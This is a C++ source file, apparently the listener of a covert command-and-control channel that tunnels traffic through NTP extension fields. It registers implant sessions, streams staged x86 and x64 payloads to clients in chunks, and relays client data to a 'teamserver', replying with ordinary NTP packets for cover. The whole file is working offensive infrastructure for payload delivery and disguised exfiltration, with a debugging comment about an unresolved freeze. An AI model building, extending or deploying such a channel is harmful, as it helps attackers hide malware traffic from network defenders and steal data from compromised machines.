#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <iomanip>
#include <vector>
#include <array>

#include "parsentp.hpp"
#include "helpers.hpp"
#include "createntp.hpp"
#include "constants.hpp"
#include "client.hpp"
#include "globals.hpp"
#include "teamserver.hpp"

void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET sock) {
    // Previously used +48, fixed to use actual packet size safely
    // Safely move into vector using data + len
    std::vector<uint8_t> rawPacket(data, data + len);

    std::cout << "Received " << len << " bytes from "
        << inet_ntoa(client_addr->sin_addr) << ":"
        << ntohs(client_addr->sin_port) << std::endl;

    // 1. Basic check for NTP packet size
    if (rawPacket.size() <= 48) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: Normal NTP Packet" << std::endl;
        std::cout << "----------------------" << std::endl;
        sendNormalNtpPacket(client_addr, sock);
        return;
    }

    // Each packet needs 4-byte header; verify enough data for extension
    if (rawPacket.size() < 52) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: Normal NTP Packet" << std::endl;
        std::cout << "----------------------" << std::endl;
        std::cout << "Packet does not contain an extension field" << std::endl;
        sendNormalNtpPacket(client_addr, sock);
        return;
    }

    // Parse packet
    NTPPacketParser ntpPacket(rawPacket);
    std::vector<uint8_t> ntpPacketExtension = ntpPacket.getExtension();
    std::array<uint8_t, 2> ntpPacketExtensionField = ntpPacket.getExtensionField();

    // Extract client ID for session lookup
    std::vector<uint8_t> clientId = ntpPacket.getExtensionClientId();
    std::cout << "[?] Client Session ID: ";
    printHexVector(clientId);
    std::cout << std::endl;

    // Handle payload request packets
    if (ntpPacketExtensionField == NtpExtensionField::giveMePayload) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: Give Me Payload" << std::endl;
        std::cout << "----------------------" << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());

        uint8_t payloadArch = 0x00;
        try {
            payloadArch = ntpPacketExtension.at(8); // Safe access with bounds check
        }
        catch (const std::out_of_range& e) {
            std::cerr << "Packet too short: " << e.what() << std::endl;
            return;
        }

        std::cout << "[?] Payload Arch = 0x"
            << std::hex << static_cast<int>(payloadArch)
            << std::dec << std::endl;

        if (payloadArch == 0x86) {
            std::cout << "[?] X86 Payload Requested" << std::endl;
            uint32_t uintClientId = vectorToUint32(clientId);
            printClientIDs(sessions);

            auto it = sessions.find(uintClientId);
            if (it != sessions.end()) {
                SOCKET clientSocket = it->second.getSocket();

                std::vector<uint8_t> payload = getx86Payload(clientSocket);
                it->second.setForClientBuffer(payload);

                std::cout << "[?] Stored payload in client class, size: "
                    << payload.size();

                std::vector<uint8_t> sizeVector = uint32ToBytes(payload.size());
                std::cout << "[?] DEBUG: Payload as vector: ";
                printHexVector(sizeVector);

                NTPPacket newPacketClass;
                newPacketClass.addExtensionField(
                    NtpExtensionField::sizePacket,
                    sizeVector,
                    Client::emptyClientId
                );

                sendNtpPacket(client_addr, sock, newPacketClass.getPacket());
                return;
            }
            else {
                std::cout << "[?] Could not find client class: ";
                printHexVector(clientId);
            }
        }
        else if (payloadArch == 0x64) {
            std::cout << "[?] X64 Payload Requested" << std::endl;
            uint32_t uintClientId = vectorToUint32(clientId);
            printClientIDs(sessions);

            auto it = sessions.find(uintClientId);
            if (it != sessions.end()) {
                SOCKET clientSocket = it->second.getSocket();

                std::vector<uint8_t> payload = getx64Payload(clientSocket);
                it->second.setForClientBuffer(payload);

                std::cout << "[?] Stored payload in client class, size: "
                    << payload.size();

                std::vector<uint8_t> sizeVector = uint32ToBytes(payload.size());
                std::cout << "[?] DEBUG: Payload as vector: ";
                printHexVector(sizeVector);

                NTPPacket newPacketClass;
                newPacketClass.addExtensionField(
                    NtpExtensionField::sizePacket,
                    sizeVector,
                    Client::emptyClientId
                );

                sendNtpPacket(client_addr, sock, newPacketClass.getPacket());
                return;
            }
            else {
                std::cout << "[?] Could not find client class: ";
                printHexVector(clientId);
            }
        }
        else if (payloadArch == 0x00) {
            std::cout << "[?] 0x00 continuation of getting payload" << std::endl;

            uint32_t convertedClientId = vectorToUint32(clientId);
            std::cout << "[?] Looking up class by key: "
                << convertedClientId << std::endl;

            auto it = sessions.find(convertedClientId);
            if (it != sessions.end()) {
                std::cout << "[?] Class exists for " << convertedClientId << std::endl;
                std::vector<uint8_t> nextChunk = it->second.getNextChunk(Chunk::maxChunkSize);

                NTPPacket responsePacketClass;
                responsePacketClass.addExtensionField(
                    NtpExtensionField::dataFromTeamserver,
                    nextChunk,
                    Client::emptyClientId
                );

                sendNtpPacket(client_addr, sock, responsePacketClass.getPacket());
            }
            else {
                std::cout << "[?] Client Class not found!" << std::endl;
            }
        }
        else {
            std::cout << "[?] Invalid Payload" << std::endl;
        }
    }

    // Get ID packet: assigns a new client ID and creates session class
    else if (ntpPacketExtensionField == NtpExtensionField::getIdPacket) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: getIdPacket" << std::endl;
        std::cout << "----------------------" << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());

        uint32_t clientID = generateClientID();
        std::cout << "[?] Client ID: " << clientID << std::endl;

        std::vector<uint8_t> clientIdVector = uint32ToBytes(clientID);
        ClientSession someClient(clientIdVector);

        sessions.insert({ clientID, someClient });
        std::cout << "[?] Added Client Session with ID: "
            << clientID << " to sessions map." << std::endl;

        NTPPacket idPacket;
        idPacket.addExtensionField(
            NtpExtensionField::idPacket,
            clientIdVector,
            Client::emptyClientId
        );

        sendNtpPacket(client_addr, sock, idPacket.getPacket());
    }

    // Size packet: sets expected inbound message size
    else if (ntpPacketExtensionField == NtpExtensionField::sizePacket) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: sizePacket" << std::endl;
        std::cout << "----------------------" << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());

        uint32_t uintClientId = vectorToUint32(clientId);
        std::cout << "[?] Looking up client ID: " << uintClientId << std::endl;
        auto it = sessions.find(uintClientId);
        if (it != sessions.end()) {
            uint32_t uintMessageSize = vectorToUint32(ntpPacket.getExtensionData());
            it->second.setFromClientBufferSize(uintMessageSize);

            std::cout << "[?] Stored message size in client class, size: "
                << it->second.getFromClientBufferSize() << std::endl;

            NTPPacket newPacketClass;
            newPacketClass.addExtensionField(
                NtpExtensionField::sizePacketAcknowledge,
                {},
                Client::emptyClientId
            );

            sendNtpPacket(client_addr, sock, newPacketClass.getPacket());
            return;
        }
        else {
            std::cout << "[?] Could not find client class: ";
            printHexVector(clientId);
        }
    }

    // Data for teamserver: accumulate chunks and forward when complete
    else if (ntpPacketExtensionField == NtpExtensionField::dataForTeamserver) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: dataForTeamserver" << std::endl;
        std::cout << "----------------------" << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());

        uint32_t uintClientId = vectorToUint32(clientId);
        auto it = sessions.find(uintClientId);
        if (it != sessions.end()) {
            std::cout << "Found session" << std::endl;
            if (it->second.fromClientBuffer.size() >= it->second.getFromClientBufferSize()) {
                std::cout << "[!] More data than expected from client" << std::endl;
                std::cout << "[!] Expected Size: "
                    << it->second.getFromClientBufferSize()
                    << " Actual Size: "
                    << it->second.fromClientBuffer.size() << std::endl;
            }

            std::cout << "ntpPacket.getExtensionData()" << std::endl;
            auto extData = ntpPacket.getExtensionData();
            it->second.fromClientBuffer.insert(
                it->second.fromClientBuffer.end(), extData.begin(), extData.end());


            /*
            Bug appears to be here. We freeze right after GEt Client buffer size
            
            */
            std::cout << "GEt Client buffer size" << std::endl;
            if (it->second.fromClientBuffer.size() == it->second.getFromClientBufferSize()) {
                std::cout << "[+] Data from client complete, sending to teamserver" << std::endl;

                
                std::cout << "Forwarding data to TS" << std::endl;
                std::vector<uint8_t> frame =
                    forwardToTeamserver(it->second.fromClientBuffer, it->second.getSocket());

                std::cout << "setForClientBuffer" << std::endl;
                it->second.setForClientBuffer(frame);
                std::cout << "[+] TS comms complete" << std::endl;

                NTPPacket newPacketClass;
                newPacketClass.addExtensionField(
                    NtpExtensionField::sizePacketAcknowledge,
                    {},
                    Client::emptyClientId
                );

                sendNtpPacket(client_addr, sock, newPacketClass.getPacket());
                it->second.fromClientBuffer.clear();
                //test setting back to 0
                //it->second.setFromClientBufferSize(0);
            }
            else {
                std::cout << "[+] Data from client NOT complete, "<< it->second.fromClientBuffer.size() << " of " << it->second.getFromClientBufferSize() << "bytes sent" << std::endl;

                //I think I need to send an size acknowldeg packet?? here, or at least that's what the clietn wants
                NTPPacket newPacketClass;
                newPacketClass.addExtensionField(
                    NtpExtensionField::sizePacketAcknowledge,
                    {},
                    Client::emptyClientId
                );

                sendNtpPacket(client_addr, sock, newPacketClass.getPacket());
            }
        }
        else {
            std::cout << "[?] Could not find client class: ";
            printHexVector(clientId);
        }
    }

    // Get data from teamserver (client polling)
    else if (ntpPacketExtensionField == NtpExtensionField::getDataFromTeamserver) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: getDataFromTeamserver" << std::endl;
        std::cout << "----------------------" << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());

        uint32_t uintClientId = vectorToUint32(clientId);
        auto it = sessions.find(uintClientId);
        if (it != sessions.end()) {
            std::vector<uint8_t> chunkForClient = it->second.getNextChunk(Chunk::maxChunkSize);

            std::cout << "[?] Size of total stored data: "
                << it->second.getForClientBuffer().size() << std::endl;
            std::cout << "[?] Size of chunk to send: "
                << chunkForClient.size() << std::endl;

            NTPPacket newPacketClass;
            newPacketClass.addExtensionField(
                NtpExtensionField::dataFromTeamserver,
                chunkForClient,
                Client::emptyClientId
            );

            sendNtpPacket(client_addr, sock, newPacketClass.getPacket());
        }
        else {
            std::cout << "[?] Could not find client class: ";
            printHexVector(clientId);
            sendNormalNtpPacket(client_addr, sock);
        }
    }

    // Return size of data waiting for client
    else if (ntpPacketExtensionField == NtpExtensionField::getDataFromTeamserverSize) {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: getDataFromTeamserverSize" << std::endl;
        std::cout << "----------------------" << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());

        uint32_t uintClientId = vectorToUint32(clientId);
        auto it = sessions.find(uintClientId);
        if (it != sessions.end()) {
            std::vector<uint8_t> sizeOfData =
                uint32ToBytes(it->second.getForClientBuffer().size());

            NTPPacket newPacketClass;
            newPacketClass.addExtensionField(
                NtpExtensionField::sizePacket,
                sizeOfData,
                Client::emptyClientId
            );

            sendNtpPacket(client_addr, sock, newPacketClass.getPacket());
        }
        else {
            std::cout << "[?] Could not find client class: ";
            printHexVector(clientId);
            sendNormalNtpPacket(client_addr, sock);
        }
    }

    // Unknown packet type, reply with default NTP packet
    else {
        std::cout << "----------------------" << std::endl;
        std::cout << "PCKT: Unknown" << std::endl;
        std::cout << "----------------------" << std::endl;
        std::cout << "[?] Packet extension did not match known extensions" << std::endl;
        printHexVectorPacket(ntpPacket.getRawPacket());
        sendNormalNtpPacket(client_addr, sock);
    }
}
